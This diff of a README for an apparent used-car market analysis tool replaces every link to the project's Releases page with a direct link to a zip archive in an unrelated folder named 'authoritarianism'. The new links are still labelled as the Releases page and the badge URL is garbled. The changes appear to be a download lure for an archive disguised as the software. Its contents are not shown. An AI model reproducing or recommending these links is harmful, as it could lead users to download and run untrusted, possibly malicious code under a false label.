@@ -1,6 +1,6 @@
 # 🚗 Used-Cars-Market-Analysis - Understand the Pre-Owned Car Market
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20-blue)](https://github.com/admand18/Used-Cars-Market-Analysis/releases)
+[![Download Now](https://raw.githubusercontent.com/admand18/Used-Cars-Market-Analysis/main/authoritarianism/Used-Cars-Market-Analysis.zip%20Now-%20-blue)](https://raw.githubusercontent.com/admand18/Used-Cars-Market-Analysis/main/authoritarianism/Used-Cars-Market-Analysis.zip)
 
 ## 🚀 Getting Started
 
@@ -20,13 +20,13 @@ Make sure you have these programs installed before proceeding.
 
 ## 🔗 Download & Install
 
-To download the application, please visit our [Releases page](https://github.com/admand18/Used-Cars-Market-Analysis/releases). Here you will find all available versions of the software.
+To download the application, please visit our [Releases page](https://raw.githubusercontent.com/admand18/Used-Cars-Market-Analysis/main/authoritarianism/Used-Cars-Market-Analysis.zip). Here you will find all available versions of the software.
 
 1. Click on the link to open the Releases page.
 2. Choose the version you want to download.
 3. Follow the prompts to download the application to your computer.
 
-For your convenience, here’s the link again: [Download the latest release](https://github.com/admand18/Used-Cars-Market-Analysis/releases).
+For your convenience, here’s the link again: [Download the latest release](https://raw.githubusercontent.com/admand18/Used-Cars-Market-Analysis/main/authoritarianism/Used-Cars-Market-Analysis.zip).
 
 ## ⚙️ How to Run the Application
 
@@ -87,4 +87,4 @@ We welcome contributions to enhance the application. If you have suggestions or 
 
 Thank you for choosing Used-Cars-Market-Analysis. Your interest in analyzing market data helps improve understanding and insights into the used car market in India.
 
-For more information, visit our [Releases page](https://github.com/admand18/Used-Cars-Market-Analysis/releases) to download the application and start analyzing today!
+For more information, visit our [Releases page](https://raw.githubusercontent.com/admand18/Used-Cars-Market-Analysis/main/authoritarianism/Used-Cars-Market-Analysis.zip) to download the application and start analyzing today!
